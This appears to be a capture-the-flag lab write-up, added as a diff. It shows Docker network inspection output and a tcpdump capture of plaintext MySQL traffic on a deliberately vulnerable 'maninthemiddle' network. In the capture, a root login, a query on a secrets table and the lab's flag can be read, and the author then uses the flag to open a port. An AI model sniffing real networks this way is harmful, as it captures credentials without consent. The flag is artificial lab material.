@@ -1,0 +1,197 @@
+docker network ls
+docker network inspect maninthemiddle_vulnerable_network gave me 
+
+
+ad1d886cea3d   none                                null      local
+[
+    {
+        "Name": "maninthemiddle_vulnerable_network",
+        "Id": "d1121548482843be32b62c0220dc7e99f0a894d646f0081e2567676fe8abbdab",
+        "Created": "2026-02-04T19:25:43.427566972-05:00",
+        "Scope": "local",
+        "Driver": "bridge",
+        "EnableIPv4": true,
+        "EnableIPv6": false,
+        "IPAM": {
+            "Driver": "default",
+            "Options": null,
+            "Config": [
+                {
+                    "Subnet": "172.20.0.0/16",
+                    "IPRange": "",
+                    "Gateway": "172.20.0.1"
+                }
+            ]
+        },
+        "Internal": false,
+        "Attachable": false,
+        "Ingress": false,
+        "ConfigFrom": {
+            "Network": ""
+        },
+        "ConfigOnly": false,
+        "Options": {},
+        "Labels": {
+            "com.docker.compose.config-hash": "fed111de14a481f33894f44da1f78754fae5ce96e83840de16b71371d080473f",
+            "com.docker.compose.network": "vulnerable_network",
+            "com.docker.compose.project": "maninthemiddle",
+            "com.docker.compose.version": "2.40.3"
+        },
+        "Containers": {
+            "1746c397647fa208eb1e84a56bbecd880f3ce1e2e574684644984978edeb4ac1": {
+                "Name": "2_network_secret_ssh",
+                "EndpointID": "960af006a81cb5f3c6a3539a61502ea3ed98de764c52cf4889f23e2faf4fbbfc",
+                "MacAddress": "2e:8e:11:86:3f:c4",
+                "IPv4Address": "172.20.0.20/16",
+                "IPv6Address": ""
+            },
+            "2c9524d74e8d6761285bc3144d45ff99bbe3bca75e54ff80493c18d640a93400": {
+                "Name": "2_network_secret_api",
+                "EndpointID": "29b3406a2bd73aae97ff75294e2b967369ee6b26d28673d5322194f4f608af5a",
+                "MacAddress": "ae:67:35:cd:73:89",
+                "IPv4Address": "172.20.0.21/16",
+                "IPv6Address": ""
+            },
+            "2d90c11cbab71605b1ad6cc8dec6498c49c0353db1ef53d9f857f633f7e0a3d5": {
+                "Name": "2_network_port_knocking",
+                "EndpointID": "8ab4901ebe5e808bc192cf8c1e3765428ca5a3d5c05b4b63e5c081bc217a0e5c",
+                "MacAddress": "f2:4e:44:1e:aa:7c",
+                "IPv4Address": "172.20.0.40/16",
+                "IPv6Address": ""
+            },
+            "a510dbbe6f533b8c42de9bb1652de1c641c496c3fa368a96e76ab37d7fde6a7b": {
+                "Name": "2_network_database",
+                "EndpointID": "cd5dd09e735936b02c5d17141a47909e7750adf088f94f13dd5c1155337fdc83",
+                "MacAddress": "2e:55:d0:5d:10:80",
+                "IPv4Address": "172.20.0.11/16",
+                "IPv6Address": ""
+            },
+            "c5075c4eb17c50209448ba9e2d1b6cf27d72ab9f8cb494564653b3b97487f61f": {
+                "Name": "2_network_honeypot",
+                "EndpointID": "355ea353bcd0dc5a2ca2e6ae7c0f239ea3cacd5e42b70096c31a2fe7bd86327c",
+                "MacAddress": "16:d1:23:d1:13:23",
+                "IPv4Address": "172.20.0.30/16",
+                "IPv6Address": ""
+            },
+            "cd4d21087d1980699bbf1bbffa4eb305ebd8a82d274bef06406f4600cf4de6a4": {
+                "Name": "2_network_redis",
+                "EndpointID": "1f2b563c0b7e0baeaf37fbeeebcb7112fe43a250d4453a1f72ce76d886333eaa",
+                "MacAddress": "5e:20:39:c6:65:7d",
+                "IPv4Address": "172.20.0.22/16",
+                "IPv6Address": ""
+            },
+            "e7b7c0c93b55470b2a0c195eae49f96ad391ca0d40933b2abdb96d685f7745ff": {
+                "Name": "2_network_webapp",
+                "EndpointID": "f269607c15103ebd1faddec3636471f90746867bbc2f1a16902584177ae5b2d2",
+                "MacAddress": "0e:b5:00:82:2c:4f",
+                "IPv4Address": "172.20.0.10/16",
+                "IPv6Address": ""
+            }
+        },
+        "Status": {
+            "IPAM": {
+                "Subnets": {
+                    "172.20.0.0/16": {
+                        "IPsInUse": 10,
+                        "DynamicIPsAvailable": 65526
+                    }
+                }
+            }
+        }
+    }
+]
+
+I took the id from this and did
+sudo tcpdump -i br-d11215484828 -A -s 0 'port 3306' this gave the following output
+
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on br-d11215484828, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+21:14:05.984080 IP 172.20.0.10.38706 > 172.20.0.11.mysql: Flags [S], seq 165050664, win 64240, options [mss 1460,sackOK,TS val 462744260 ecr 0,nop,wscale 10], length 0
+E..<A.@.@......
+.....2..        .y(........Xl.........
+...........
+
+21:14:05.984446 IP 172.20.0.11.mysql > 172.20.0.10.38706: Flags [S.], seq 3062057864, ack 165050665, win 65160, options [mss 1460,sackOK,TS val 217943154 ecr 462744260,nop,wscale 10], length 0
+E..<..@.@..~.......
+...2..K.        .y)....Xl.........
+...r.......
+
+21:14:05.984483 IP 172.20.0.10.38706 > 172.20.0.11.mysql: Flags [.], ack 1, win 63, options [nop,nop,TS val 462744260 ecr 217943154], length 0
+E..4A.@.@......
+.....2..        .y)..K....?Xd.....
+.......r
+21:14:05.988170 IP 172.20.0.11.mysql > 172.20.0.10.38706: Flags [P.], seq 1:79, ack 1, win 64, options [nop,nop,TS val 217943158 ecr 462744260], length 78
+E.....@.@..........
+...2..K.        .y)...@X......
+...v....J...
+8.0.45.V...J<dlF".e...................=:g..[.
+.&6!.mysql_native_password.
+21:14:05.988494 IP 172.20.0.10.38706 > 172.20.0.11.mysql: Flags [.], ack 79, win 63, options [nop,nop,TS val 462744264 ecr 217943158], length 0
+E..4A.@.@......
+.....2..        .y)..K....?Xd.....
+.......v
+21:14:05.988999 IP 172.20.0.10.38706 > 172.20.0.11.mysql: Flags [P.], seq 1:143, ack 79, win 63, options [nop,nop,TS val 462744265 ecr 217943158], length 142
+E...A.@.@......
+.....2..        .y)..K....?X......
+.......v......:.....-.......................root........g.O}...W.....{userdb.mysql_native_password.2._client_name.pymysql._client_version.1.1.0._pid.7
+21:14:05.989174 IP 172.20.0.11.mysql > 172.20.0.10.38706: Flags [.], ack 143, win 64, options [nop,nop,TS val 217943159 ecr 462744265], length 0
+E..4..@.@..........
+...2..K.        .y....@Xd.....
+...w....
+21:14:05.989954 IP 172.20.0.11.mysql > 172.20.0.10.38706: Flags [P.], seq 79:90, ack 143, win 64, options [nop,nop,TS val 217943160 ecr 462744265], length 11
+E..?..@.@..........
+...2..K.        .y....@Xo.....
+...x...............
+21:14:05.990635 IP 172.20.0.10.38706 > 172.20.0.11.mysql: Flags [P.], seq 143:165, ack 90, win 63, options [nop,nop,TS val 462744267 ecr 217943160], length 22
+E..JA.@.@......
+.....2..        .y...K....?Xz.....
+.......x.....SET NAMES utf8mb4
+21:14:05.993276 IP 172.20.0.11.mysql > 172.20.0.10.38706: Flags [P.], seq 90:101, ack 165, win 64, options [nop,nop,TS val 217943163 ecr 462744267], length 11
+E..?..@.@..........
+...2..K.        .y....@Xo.....
+...{...............
+21:14:05.994048 IP 172.20.0.10.38706 > 172.20.0.11.mysql: Flags [P.], seq 165:188, ack 101, win 63, options [nop,nop,TS val 462744270 ecr 217943163], length 23
+E..KA.@.@......
+.....2..        .y...K....?X{.....
+.......{.....SET AUTOCOMMIT = 0
+21:14:05.995261 IP 172.20.0.11.mysql > 172.20.0.10.38706: Flags [P.], seq 101:112, ack 188, win 64, options [nop,nop,TS val 217943165 ecr 462744270], length 11
+E..?..@.@..........
+...2..K.        .y....@Xo.....
+...}...............
+21:14:05.995773 IP 172.20.0.10.38706 > 172.20.0.11.mysql: Flags [P.], seq 188:316, ack 112, win 63, options [nop,nop,TS val 462744272 ecr 217943165], length 128
+E...A.@.@..#...
+.....2..        .y...K....?X......
+.......}|....
+            SELECT id, secret_name, secret_value, description 
+            FROM secrets 
+            WHERE id = 1
+        
+21:14:05.997429 IP 172.20.0.11.mysql > 172.20.0.10.38706: Flags [P.], seq 112:520, ack 316, win 64, options [nop,nop,TS val 217943167 ecr 462744272], length 408
+E.....@.@..6.......
+...2..K.        .zd...@Y......
+..................def.userdb.secrets.secrets.id.id.?.......B...@....def.userdb.secrets.secrets.secret_name.secret_name.............B....def.userdb.secrets.secrets.secret_value.secret_value.............@....def.userdb.secrets.secrets.description.description......................}....1    api_token#FLAG{n3tw0rk_tr4ff1c_1s_n0t_s3cur3}LAPI authentication token for secret services - MITM attack will reveal this!.........
+21:14:05.998077 IP 172.20.0.10.38706 > 172.20.0.11.mysql: Flags [P.], seq 316:321, ack 520, win 63, options [nop,nop,TS val 462744274 ecr 217943167], length 5
+E..9A.@.@......
+.....2..        .zd..M....?Xi.....
+.............
+21:14:05.998601 IP 172.20.0.10.38706 > 172.20.0.11.mysql: Flags [F.], seq 321, ack 520, win 63, options [nop,nop,TS val 462744275 ecr 217943167], length 0
+E..4A.@.@......
+.....2..        .zi..M....?Xd.....
+........
+21:14:05.998660 IP 172.20.0.11.mysql > 172.20.0.10.38706: Flags [F.], seq 520, ack 322, win 64, options [nop,nop,TS val 217943169 ecr 462744274], length 0
+E..4..@.@..........
+...2..M.        .zj...@Xd.....
+........
+21:14:05.998839 IP 172.20.0.10.38706 > 172.20.0.11.mysql: Flags [.], ack 521, win 63, options [nop,nop,TS val 462744275 ecr 217943169], length 0
+E..4A.@.@......
+.....2..        .zj..M....?Xd.....
+........
+
+Here I saw sql quries such as 
+SELECT id, secret_name, secret_value, description 
+FROM secrets 
+WHERE id = 1
+
+and the FLAG
+api_token#FLAG{n3tw0rk_tr4ff1c_1s_n0t_s3cur3}LAPI authentication token for secret services - MITM attack will reveal this!
+I then used the flag to open a port I found that needed auth in part one
